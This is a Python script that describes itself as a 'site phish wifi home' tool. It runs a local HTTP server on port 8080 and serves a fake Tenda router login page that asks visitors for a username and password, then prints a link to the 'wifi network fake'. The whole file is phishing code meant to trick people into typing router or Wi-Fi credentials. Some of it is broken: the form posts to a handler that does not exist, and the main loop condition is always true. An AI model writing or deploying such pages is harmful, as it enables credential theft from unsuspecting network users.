from http.server import BaseHTTPRequestHandler, HTTPServer
import socket
import requests
from datetime import datetime
import time

class color:
   red = '\33[91m'
   blue = '\33[94m'
   green = '\33[92m'
   zard = '\33[93m'
print(f"""{color.blue}
+++++++++++++++++++++++{color.zard}Mr-Banana-2045{color.blue}+++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++                           +++    +++    +++++++++    +++
 +++          ++++++         +++     +++    +++++++++    +++
  +++        +++++++        +++             +++          
   +++      +++   +++      +++       +++    +++++++++    +++
    +++    +++     +++    +++        +++    +++          +++
     +++  +++       +++  +++         +++    +++          +++
     +++++++         ++++++          +++    +++          +++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
               +++ {color.red}site phish wifi home {color.blue}+++
""")
class MyServere(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()  
        self.wfile.write(bytes("""
<!DOCTYPE HTML>
<html>
  <head>
    <title>login tenda</title>
    <script src="http://code.jquery.com/jquery-3.3.1.js"></script>
    <script>
        function test()
        {
            var message = $('input[name=message]').val();
            $.ajax({
                url: "/cgi-bin/hello.py",
                type: "POST",
                data: {"text" : message},
                success: function(response){
                        $("#div").html(response);
                }
            });
        };

    </script>
        <style>
          .body{
          background: orange;
            padding: 5px;
            height: 5%;
            text-align: center;
          }
          .back{
          background: orange;
            padding: 5px;
            height: 2%;
            text-align: left;
            }
            .container {
              background: #F5F5F5;
                margin: 10px auto;
                width: 80%;
                border: 1px solid #eee;
                text-align: center;
            }
            .form-control {
                padding: 8px;
            }
            input {
                border-radius: 5px;
                border: 1px solid #eee;
                padding: 3px 6px;
                background: yellow;
                border-radius:1px 1px 1px 1px;
            }
            input#email {
                margin-left: 27px;
            }
            input[type="submit"] {
                background-color: dodgerblue;
                color: white;
                cursor: pointer;
            }
            h3{
              color: white;
                font-size: 13px;
                height: 5%;
                font-style: oblique;
              }
            button{
              background: cyan;
                opacity: 0.8;
                border: 0px;
                padding: 8px 8px;
              }
            label{
              font-size: 15px;
              }
            img{
              width: 13%;
              }
        </style>
  </head>
  <body>
    <div class="body">
      <img src="https://s6.uupload.ir/files/polish_20220906_140314256_06t5.png">
      </div>
      <div class="container">
        <div class="back">
        <h3>Login</h3>
      </div>
              <div class="form-control">
    <form>
      <div class="form-control">
        <label for='fname'>Username:</label>
    <input type="text" name="username">
  </div>
  <div class="form-control">
    <label for='lname'>Password:</label>
    <input type="password" name="password">
  </div>
  <div class="form-control">
    <button type="submit" value="submit" onclick="test()">Login</button>
  </div>
    </form>

  </body>
</html>""", "utf-8"))
now = datetime.now()
date = now.strftime("%m/%d/%Y")
time = now.strftime("%H:%M:%S")
moz = input("start script Enter Y or N: ")
while moz.upper() == "Y" or "N":
    if moz.upper() == "N":
        exit()
    elif moz.upper() == "Y":
        print(f"{color.green}date :{color.zard}",date)
        print(f"{color.green}time :{color.zard}",time)
        print(f"{color.green}localhost :{color.zard} 127.0.0.1")
        host_name = socket.gethostname()
        IP_address = socket.gethostbyname(host_name)
        print(f"{color.green}ip address :{color.zard}",IP_address)
        if __name__ == "__main__":
            webServere = HTTPServer((IP_address, 8080), MyServere)
            print(f"{color.green}Link wifi network fake :{color.zard} http//%s:%s%s" % (IP_address, 8080,'/WIFI_TENDA'))
        try:
            webServere.serve_forever()
        except KeyboardInterrupt:
            pass
        webServere.server_close()
        print("OFLINE")
        exit()
    else:
        print("OFF")